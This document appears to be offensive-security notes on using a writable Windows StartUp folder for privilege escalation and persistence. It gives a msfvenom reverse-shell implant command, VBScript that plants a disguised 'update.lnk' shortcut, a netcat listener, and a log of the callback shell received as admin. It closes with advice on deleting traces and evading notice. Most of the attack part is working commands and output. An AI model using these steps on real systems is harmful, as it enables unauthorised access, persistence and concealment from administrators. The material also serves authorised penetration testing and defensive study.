# Living off the Land

One of the privilege escalation technique and so far the easiest ones to exploit it is Startup programs in the `StartUp` folder. Some versions of Windows operating systems vary to one another and it could be server or a workstation do a bit of research to find those locations and this technique is part of persistence mechanism to maintain access.

Windows Server 2012 or later

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

Windows 7 or later

```
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

## 01 - Detect

```
C:\> icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp BUILTIN\Users:(OI)(CI)(F)
                                                             WIN-QBA94KB3IOF\Administrator:(I)(OI)(CI)(DE,DC)
                                                             WIN-QBA94KB3IOF\admin:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)
```

## 02 - Exploit

TODO: Take note of the timestamp with powershell to clear traces

```
$ msfvenom -p windows/x64/shell_reverse_shell lhost=<IP> lport=53 -f exe -o implant.exe
```

We can copy the implant to the start up folder or we can create a shortcut link file to redirect the path of our implant.

```vbscript
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\path\to\implant"
oLink.Save
```

Execute the modified VBScript.

```
C:\> cscript CreateShortcut.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.
```

Launch the shell handler.

```
$ sudo nc -lvnp 53
```

Now we wait for the administrator user to login and wait for a callback connection.

```
$ xfreerdp /u:"<username>" /p:"<password>" /sec:<rdp | tls | nla> /v:<IP>

$ sudo nc -lvnp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.221.80.
Ncat: Connection from 10.10.221.80:49882.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
win-qba94kb3iof\admin
```

## 03 - Cleanup

Now the problem is through this netcat handler we can't revert back to it's original binary file. However, once you perform this technique use metasploit framework as a shell handler since it is easily can be migrated to another process and to revert back just like I've previously demonstrated when covering your traces. Take this OPSEC measure into account.

```
C:\Windows\system32> del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.lnk"

C:\Windows\system32> del /path/to/shell.exe
```